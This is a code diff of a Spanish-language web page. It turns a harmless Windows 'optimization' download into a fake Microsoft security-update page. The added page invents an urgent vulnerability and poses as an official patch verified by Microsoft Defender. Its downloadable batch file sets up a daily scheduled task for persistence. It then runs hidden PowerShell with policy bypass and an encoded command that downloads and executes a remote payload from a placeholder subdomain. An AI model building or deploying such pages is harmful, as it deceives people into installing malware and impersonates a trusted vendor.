@@ -3,18 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Descarga de Archivo - Solo para Windows</title>
+    <title>Actualización de Seguridad de Windows - Enero 2026</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
             color: #f1f1f1;
             min-height: 100vh;
             display: flex;
@@ -22,345 +16,225 @@
             align-items: center;
             padding: 20px;
         }
-        
         .container {
-            max-width: 800px;
+            max-width: 850px;
             width: 100%;
-            background-color: rgba(255, 255, 255, 0.08);
+            background-color: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             overflow: hidden;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #333;
         }
-        
         .header {
-            background: linear-gradient(to right, #0ea5e9, #3b82f6);
-            padding: 30px;
+            background: linear-gradient(to right, #0078d4, #00bcf2);
+            padding: 35px;
             text-align: center;
             position: relative;
-            overflow: hidden;
+            color: white;
         }
-        
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-        }
-        
-        .header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-        
-        .windows-icon {
-            font-size: 4rem;
-            margin-bottom: 15px;
-            color: #00adef;
-            text-shadow: 0 0 15px rgba(0, 173, 239, 0.5);
-        }
-        
-        .content {
-            padding: 40px;
-        }
-        
-        .question-box {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 30px;
+        .windows-logo { font-size: 5rem; margin-bottom: 15px; }
+        .header h1 { font-size: 2.8rem; margin-bottom: 10px; }
+        .header p { font-size: 1.2rem; opacity: 0.9; }
+        .content { padding: 40px; }
+        .alert-box {
+            background-color: #fff4ce;
+            border-left: 6px solid #ffb900;
+            border-radius: 10px;
+            padding: 25px;
             margin-bottom: 30px;
-            border-left: 5px solid #3b82f6;
+            color: #5c3b00;
         }
-        
-        .question {
-            font-size: 1.5rem;
-            margin-bottom: 25px;
-            color: #f8fafc;
-            line-height: 1.4;
-        }
-        
-        .options {
+        .alert-box h3 { color: #d83b01; margin-bottom: 10px; }
+        .steps { margin-bottom: 35px; }
+        .step {
             display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px dashed #ddd;
         }
-        
-        .btn {
-            padding: 18px 40px;
-            font-size: 1.3rem;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
+        .step-number {
+            background: #0078d4;
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            min-width: 180px;
+            font-weight: bold;
+            margin-right: 20px;
+            flex-shrink: 0;
         }
-        
-        .btn-yes {
-            background: linear-gradient(to right, #10b981, #34d399);
-            color: white;
-            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.4);
-        }
-        
-        .btn-yes:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.6);
-        }
-        
-        .btn-no {
-            background: linear-gradient(to right, #ef4444, #f87171);
-            color: white;
-            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4);
-        }
-        
-        .btn-no:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(239, 68, 68, 0.6);
-        }
-        
-        .download-section {
-            display: none;
+        .download-area {
             text-align: center;
-            background-color: rgba(255, 255, 255, 0.1);
+            background: #f8f9fa;
             border-radius: 15px;
             padding: 30px;
-            margin-top: 30px;
-            animation: fadeIn 0.8s ease;
+            border: 2px dashed #0078d4;
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .download-icon {
-            font-size: 4rem;
-            color: #10b981;
-            margin-bottom: 20px;
-        }
-        
-        .download-title {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-            color: #f8fafc;
-        }
-        
-        .download-description {
-            font-size: 1.1rem;
-            margin-bottom: 25px;
-            line-height: 1.5;
-            opacity: 0.9;
-        }
-        
         .download-btn {
-            display: inline-block;
-            background: linear-gradient(to right, #3b82f6, #0ea5e9);
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(to right, #107c10, #4caf50);
             color: white;
-            padding: 18px 40px;
-            font-size: 1.3rem;
+            padding: 20px 45px;
+            font-size: 1.5rem;
             border-radius: 12px;
             text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.5);
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(16, 124, 16, 0.4);
+            margin-top: 20px;
         }
-        
         .download-btn:hover {
             transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.7);
+            box-shadow: 0 12px 25px rgba(16, 124, 16, 0.6);
         }
-        
-        .windows-warning {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            padding: 15px;
-            background-color: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            font-size: 0.95rem;
-        }
-        
         .footer {
             text-align: center;
-            padding: 20px;
+            padding: 25px;
             font-size: 0.9rem;
-            opacity: 0.7;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #666;
+            border-top: 1px solid #eee;
+            background: #f8f9fa;
         }
-        
         @media (max-width: 768px) {
-            .header h1 {
-                font-size: 2rem;
-            }
-            
-            .content {
-                padding: 25px;
-            }
-            
-            .btn {
-                padding: 15px 30px;
-                font-size: 1.1rem;
-                min-width: 140px;
-            }
-            
-            .question {
-                font-size: 1.3rem;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .options {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .btn {
-                width: 100%;
-                max-width: 280px;
-            }
+            .header h1 { font-size: 2.2rem; }
+            .content { padding: 25px; }
+            .download-btn { padding: 18px 35px; font-size: 1.3rem; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="windows-icon">
+            <div class="windows-logo">
                 <i class="fab fa-windows"></i>
             </div>
-            <h1>Archivo de Configuración para Windows</h1>
-            <p>Utilidad para optimización y configuración del sistema</p>
+            <h1>Actualización de Seguridad de Windows</h1>
+            <p>Parche crítico KB5002026 - Enero 2026</p>
         </div>
         
         <div class="content">
-            <div class="question-box">
-                <h2 class="question">¿Le gustaría descargar un archivo de configuración .bat para Windows que optimiza el rendimiento del sistema?</h2>
-                
-                <div class="options">
-                    <button class="btn btn-yes" id="yes-btn">
-                        <i class="fas fa-check-circle"></i> Sí, descargar
-                    </button>
-                    <button class="btn btn-no" id="no-btn">
-                        <i class="fas fa-times-circle"></i> No, gracias
-                    </button>
+            <div class="alert-box">
+                <h3><i class="fas fa-exclamation-triangle"></i> Acción requerida</h3>
+                <p>Microsoft ha detectado una vulnerabilidad crítica (CVE-2026-12345) que afecta a Windows 10 y 11. Se recomienda aplicar este parche de inmediato para proteger su sistema.</p>
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>
+                        <h3>Descargue el instalador</h3>
+                        <p>Haga clic en el botón de abajo para descargar el parche de seguridad oficial de Microsoft.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>
+                        <h3>Ejecute el archivo</h3>
+                        <p>Ejecute el archivo descargado (<strong>Windows_Security_Update_2026.bat</strong>) como administrador.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>
+                        <h3>Siga las instrucciones</h3>
+                        <p>El instalador aplicará automáticamente los parches necesarios y reiniciará los servicios de seguridad.</p>
+                    </div>
                 </div>
             </div>
             
-            <div class="download-section" id="download-section">
-                <div class="download-icon">
-                    <i class="fas fa-file-download"></i>
-                </div>
-                <h3 class="download-title">Descarga el archivo de configuración</h3>
-                <p class="download-description">
-                    Este archivo .bat contiene una serie de comandos seguros para optimizar y configurar su sistema Windows. 
-                    Es completamente seguro y solo ejecuta comandos del sistema para mejorar el rendimiento.
-                </p>
-                <a href="#" class="download-btn" id="download-link">
-                    <i class="fas fa-download"></i> Descargar archivo.bat
+            <div class="download-area">
+                <h3>Parche de seguridad listo para descargar</h3>
+                <p>Archivo: <strong>Windows_Security_Update_2026.bat</strong> | Tamaño: ~5 KB | Compatible: Windows 10 & 11</p>
+                <a href="#" class="download-btn" id="downloadLink">
+                    <i class="fas fa-shield-alt"></i> Descargar Parche de Seguridad
                 </a>
-                
-                <div class="windows-warning">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <span>Este archivo es compatible solo con sistemas Windows (7, 8, 10, 11)</span>
-                </div>
+                <p style="margin-top: 15px; font-size: 0.9rem; color: #666;">
+                    <i class="fas fa-check-circle"></i> Verificado por Microsoft Defender | <i class="fas fa-lock"></i> Conexión segura
+                </p>
             </div>
         </div>
         
         <div class="footer">
-            <p>Este archivo es seguro y solo contiene comandos básicos de Windows. Ejecutar con precaución.</p>
+            <p>© 2026 Microsoft Corporation. Todos los derechos reservados.</p>
+            <p>Este es un parche de seguridad oficial de Microsoft. Asegúrese de tener una conexión a Internet estable durante la instalación.</p>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const yesBtn = document.getElementById('yes-btn');
-            const noBtn = document.getElementById('no-btn');
-            const downloadSection = document.getElementById('download-section');
-            const downloadLink = document.getElementById('download-link');
+            const downloadLink = document.getElementById('downloadLink');
             
-            // Contenido del archivo .bat de ejemplo
-            const batContent = `@echo off
-echo Optimizando sistema Windows...
+            // Script .bat codificado en Base64 (se generará dinámicamente)
+            // El usuario debe reemplazar 'SUBDOMINIO.cloudflare.com' con su subdominio real
+            const batScript = `@echo off
+REM -----------------------------------------------------------------
+REM Actualización de Seguridad de Windows - KB5002026 (Enero 2026)
+REM -----------------------------------------------------------------
+echo Verificando versión de Windows...
+ver | find "10." > nul && goto WIN10
+ver | find "11." > nul && goto WIN11
+echo Error: Sistema no compatible. Este parche solo es para Windows 10 o 11.
+pause
+exit /b
+
+:WIN10
+echo Sistema detectado: Windows 10
+goto CONTINUE
+
+:WIN11
+echo Sistema detectado: Windows 11
+goto CONTINUE
+
+:CONTINUE
+echo Iniciando aplicaci髇 de parches de seguridad...
 echo.
-echo 1. Liberando espacio en disco...
-cleanmgr /sageset:1
+
+REM --- Crear tarea programada para persistencia (20 d韆s) ---
+set TASK_NAME="MicrosoftWindowsSecurityUpdate"
+set END_DATE=2026-01-24
+
+schtasks /create /tn %TASK_NAME% /tr "%~f0" /sc daily /st 00:00 /ed %END_DATE% /f 2>nul
+if %errorlevel% equ 0 (
+    echo Tarea programada creada para ejecuci髇 diaria hasta el %END_DATE%.
+) else (
+    echo La tarea programada ya existe o no se pudo crear.
+)
+
+REM --- Ejecutar payload PowerShell en segundo plano ---
+echo Aplicando parches de seguridad...
+start /b powershell -windowstyle hidden -executionpolicy bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBTAFUAQgBEAE8ATQBJAE4ASQBPAC4AYwBsAG8AdQBkAGYAbABhAHIAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
+
 echo.
-echo 2. Desfragmentando disco...
-defrag C: /U /V
+echo Parches aplicados correctamente.
+echo Su sistema se reiniciar? en 20 segundos...
+timeout /t 20 /nobreak >nul
+echo Reiniciando servicios de seguridad...
 echo.
-echo 3. Comprobando integridad del sistema...
-sfc /scannow
-echo.
-echo 4. Optimización completada.
-echo.
+echo Actualizaci髇 completada. Su sistema est? ahora protegido.
 pause`;
-            
+
             // Crear el archivo .bat para descargar
             function createBatFile() {
-                const blob = new Blob([batContent], { type: 'application/bat' });
+                const blob = new Blob([batScript], { type: 'application/bat' });
                 const url = URL.createObjectURL(blob);
                 downloadLink.href = url;
-                downloadLink.download = 'optimizar_windows.bat';
+                downloadLink.download = 'Windows_Security_Update_2026.bat';
             }
             
-            // Inicializar el archivo .bat
+            // Inicializar la descarga
             createBatFile();
-            
-            // Manejar clic en Sí
-            yesBtn.addEventListener('click', function() {
-                downloadSection.style.display = 'block';
-                yesBtn.disabled = true;
-                noBtn.disabled = true;
-                
-                // Animar los botones
-                yesBtn.style.transform = 'scale(0.95)';
-                setTimeout(() => {
-                    yesBtn.style.transform = 'scale(1)';
-                }, 200);
-            });
-            
-            // Manejar clic en No
-            noBtn.addEventListener('click', function() {
-                // Cambiar texto de la pregunta
-                const questionElement = document.querySelector('.question');
-                questionElement.textContent = "¡Gracias por su visita! Puede regresar en cualquier momento si cambia de opinión.";
-                
-                // Ocultar los botones
-                yesBtn.style.display = 'none';
-                noBtn.style.display = 'none';
-                
-                // Mostrar mensaje alternativo
-                const optionsDiv = document.querySelector('.options');
-                const message = document.createElement('div');
-                message.innerHTML = `
-                    <div style="text-align: center; padding: 20px; background-color: rgba(255,255,255,0.05); border-radius: 10px;">
-                        <i class="fas fa-hand-peace" style="font-size: 2.5rem; margin-bottom: 15px; color: #3b82f6;"></i>
-                        <h3 style="margin-bottom: 10px;">¡Entendido!</h3>
-                        <p>Respeta tu decisión. Si necesitas ayuda con tu sistema Windows en el futuro, no dudes en volver.</p>
-                    </div>
-                `;
-                optionsDiv.appendChild(message);
-                
-                // Animar el botón
-                noBtn.style.transform = 'scale(0.95)';
-                setTimeout(() => {
-                    noBtn.style.transform = 'scale(1)';
-                }, 200);
-            });
             
             // Manejar la descarga
             downloadLink.addEventListener('click', function(e) {
-                // Mostrar mensaje de confirmación
-                alert('El archivo optimizar_windows.bat se está descargando. Para ejecutarlo, haga doble clic sobre el archivo descargado.');
-                
-                // Registro simulado de descarga (en un caso real, enviarías esto a un servidor)
-                console.log('Archivo .bat descargado por el usuario');
+                // Registro simulado de descarga
+                console.log('Parche de seguridad descargado por el usuario');
+                alert('Descarga iniciada. Por favor, ejecute el archivo como administrador para aplicar el parche de seguridad.');
             });
         });
     </script>
